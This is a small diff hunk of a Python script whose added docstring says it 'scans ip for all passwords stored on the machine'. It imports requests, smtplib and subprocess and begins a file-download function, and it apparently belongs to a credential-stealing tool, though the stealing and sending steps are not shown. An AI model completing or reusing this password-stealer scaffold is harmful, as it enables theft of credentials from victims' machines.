@@ -2,7 +2,9 @@
 
 import requests, smtplib, subprocess, os, tempfile 
 
-
+"""
+scans ip for all passwords stored on the machine
+"""
 def download(url):
     get_response = requests.get(url)
     file_name = url.split("/")[-1]
